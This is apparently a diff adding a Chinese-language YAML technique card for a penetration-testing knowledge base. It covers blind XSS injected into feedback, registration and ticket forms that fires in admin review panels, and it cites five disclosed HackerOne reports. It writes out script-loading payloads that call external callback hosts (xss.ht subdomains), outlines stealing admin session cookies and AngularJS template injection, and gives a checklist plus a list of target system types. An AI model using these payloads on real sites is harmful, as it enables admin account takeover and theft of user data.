@@ -1,0 +1,143 @@
+name: "用户反馈/评论表单注入 Blind XSS——瞄准后台审核面板渲染接收器"
+id: "BLIND_XSS_FORM_FIELD_ADMIN_REVIEW_SINK"
+applicable: "blackbox"
+phase: "input"
+also_phases: []
+tags: ["blind-xss", "stored-xss", "form-field", "admin-panel", "comment-review", "moderation", "CWE-79"]
+source: "https://hackerone.com/reports/197337"
+
+# ——— L3 核心 ———
+
+observation: >
+  未叙述（仅结果）。研究者发现 rockstargames.com 的 "MOUTHOFF TO ROCKSTAR" 反馈功能
+  提交数据到 /mouthoff/mouthoff/submit.json，多个输入字段（name/subject/body）
+  接受用户内容并存储，这些内容会在内部管理后台被管理员查看。
+  (原文 team summary: "an attacker would submit a malicious XSS payload in an
+  input field but cannot really see it being exploited anywhere unless the
+  malicious payload gets triggered internally within Rockstar after an admin
+  views the comments to approve/disapprove")
+
+hypothesis: >
+  未叙述（仅结果）。推断研究者认为用户提交的反馈内容会在内部后台被渲染而不做 HTML 编码，
+  因此在表单字段中注入 XSS payload 可在管理员审核时触发。
+
+action_result: >
+  在 name、subject、body 三个字段中均注入 Blind XSS payload
+  （"><script src=https://abhartiya.xss.ht></script>），
+  payload 在内部 Rockstar 管理面板被管理员查看评论时触发执行。
+  成功获取到管理员会话信息、内部用户名、IP 地址、其他用户的评论内容。
+  后台应用使用 AngularJS（ng-app 字段），可能存在进一步的模板注入/RCE。
+  (原文 team summary: "The malicious payload was submitted at
+  https://www.rockstargames.com/mouthoff/mouthoff/submit.json"
+  "This can allow attackers to view other people's information such as
+  their usernames, IP, comments"
+  "The CMS app looks like it is written in Angular JS because of the
+  ng app field so, it may be possible to exploit a RCE vulnerability
+  via angular injection")
+
+why_here_first: "未叙述（仅结果）"
+
+chaining: >
+  Blind XSS 在管理员审核面板触发 → 窃取管理员 session cookie → 接管管理后台 →
+  泄露所有用户数据（用户名/IP/评论）→ 若 AngularJS 模板注入可行则进一步 RCE。
+  (原文 team summary: "Since this is similar to Stored XSS, a malicious attacker
+  could potentially steal the victim's session cookie and completely
+  takeover the account")
+
+# ——— 落地检查清单 ———
+
+approach: >
+  在目标的用户反馈/评论/投诉/联系表单的所有输入字段中批量注入 Blind XSS payload，
+  等待 payload 在内部管理员审核/审批面板中渲染触发。
+  核心假设：用户提交内容需管理员人工审核，内部审核界面在展示时未做 HTML 编码。
+
+reasoning_chain:
+  - "问：目标是否有用户反馈、评论、投诉、联系我们等需要管理员审核的表单功能？"
+  - "问：这些表单提交后，内容是否会在某个内部管理后台被展示给管理员审核/审批？"
+  - "问：表单的多个字段（name/email/subject/body/category）是否都接受自由文本输入？"
+  - "如果是 → 在所有可控字段中注入 Blind XSS payload（如 XSSHunter/bXSS 平台的回调脚本）"
+  - "问：Blind XSS 触发后，执行上下文中有哪些高价值资产？（管理员 cookies、内部 URL 路径、其他用户数据、CSRF token）"
+  - "问：内部后台使用了什么前端框架？如果是 AngularJS，是否可以进一步尝试模板注入？"
+
+vuln_root: "内部管理审核面板在渲染用户提交的内容时未做 HTML 编码，信任了来自公开表单的非可信输入。"
+
+transferable_to:
+  - "任何有用户评论/反馈审核流程的网站（电商评论审核、社区内容审核、工单系统）"
+  - "客户支持/工单系统中展示用户提交内容的管理面板"
+  - "内容管理系统（CMS）的评论审批/审核队列"
+  - "Bug Bounty 平台或内部缺陷追踪系统中展示外部提交报告的界面"
+  - "招聘系统中展示求职者简历/申请表内容的 HR 面板"
+
+cases:
+  - url: "https://hackerone.com/reports/197337"
+    title: "Blind XSS in the admin panel for reviewing comments (Rockstar Games)"
+    author: "anshuman_bh"
+    platform: "Rockstar Games (rockstargames.com)"
+    severity: "Medium"
+    bounty: "$650"
+    note: >
+      通过 /mouthoff/mouthoff/submit.json 在 name/subject/body 字段注入
+      Blind XSS payload，在内部 Rockstar 管理面板被管理员审核评论时触发。
+      获取管理员会话、内部用户名、IP、其他用户评论。后台为 AngularJS 应用。
+      无社工，纯 Stored Blind XSS。报告为 no-content，信息来自 team summary。
+      (原文 team summary: "submit a malicious XSS payload in an input field...
+      gets triggered internally within Rockstar after an admin views the
+      comments to approve/disapprove. There was no social engineering involved.")
+  - url: "https://hackerone.com/reports/1011888"
+    title: "Improper Sanitization leads to XSS Fire on admin panel (Informatica)"
+    author: "montypythin"
+    platform: "Informatica (accounts.informatica.com)"
+    severity: "High"
+    bounty: "无赏金"
+    note: >
+      在 accounts.informatica.com/registration.html 注册表单的 Company 字段注入
+      Blind XSS payload（"><script src=https://monty.xss.ht></script>），
+      管理员在内部 CSOD 面板（/phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit）
+      查看用户记录时触发。获取管理员 cookies、内部 IP、其他客户数据。
+      纯结果文，无导航叙事。2020-10 报告，2021-08 公开。15 votes。
+  - url: "https://hackerone.com/reports/1110243"
+    title: "Blind Stored XSS on ██████ leads to takeover admin account"
+    author: "hemantsolo"
+    platform: "U.S. Dept Of Defense"
+    severity: "Critical"
+    bounty: "无赏金（VDP）"
+    note: >
+      DoD 某站点的用户 Profile 页面中 First Name/Last Name/Title/Company Name
+      字段未过滤 HTML/JS，注入 Blind XSS payload（img src=xss.ht），
+      管理员查看用户 Profile 时触发。通过 XSS Hunter 获取管理员 IP、
+      session cookies、后台截图（含 Mailchimp 客户列表/订阅邮箱等敏感信息）。
+      纯结果文，无 L3 导航叙事。
+      (原文: "various field of the profile page is not properly configured
+      to wipe out HTML tags and Javascript code which leads to store the
+      blind XSS payload in the first name, last name, title etc. and
+      whenever the admin will check the profile the code will fire")
+  - url: "https://hackerone.com/reports/173501"
+    title: "Stored XSS on Admin Access Page - Email field"
+    author: "pavanw3b"
+    platform: "Revive Adserver"
+    severity: "High"
+    bounty: "无赏金"
+    note: >
+      Revive Adserver 管理后台 Preferences > Change E-mail 中的邮箱字段未做 HTML 编码，
+      admin1 将邮箱设为 admin1@example.com<script>alert('xss');</script>，
+      admin2 访问 Inventory > Admin Access 页面时触发 XSS。
+      approach 相同：用户可编辑的 profile 字段（email）存入数据库后在管理面板渲染时未转义。
+      纯结果文，无 L3 导航叙事。
+      (原文: "The Email field is not sanitized on Inventory > Admin Access page
+      resulting in to Stored Cross-Site Scripting vulnerability.")
+  - url: "https://hackerone.com/reports/145091"
+    title: "Stored XSS from ticket messages in admin table in SupportFlow"
+    author: "whitehatter"
+    platform: "SupportFlow (WordPress plugin, iandunn-projects)"
+    severity: "XSS"
+    bounty: "$50"
+    note: >
+      SupportFlow WordPress 插件的工单系统中，用户提交的 ticket message 包含
+      XSS payload（<script>alert('XSS');</script>），管理员在 SupportFlow → All Tickets
+      页面（/wp-admin/edit.php?post_type=sf_ticket）查看工单列表时触发。
+      根源在 class-supportflow-admin.php#L1175 处渲染 ticket 内容时未做 HTML 转义。
+      (原文: "Any ticket can be created with an XSS payload... When an admin goes to
+      view the table of tickets, XSS is triggered, because the value is never
+      escaped here: ...class-supportflow-admin.php#L1175")
+      2016-06 报告，2016-06 公开。$50 赏金。纯结果文，无导航叙事。
+      approach 相同：用户提交的内容（工单消息）在管理后台表格渲染时未做 HTML 编码。
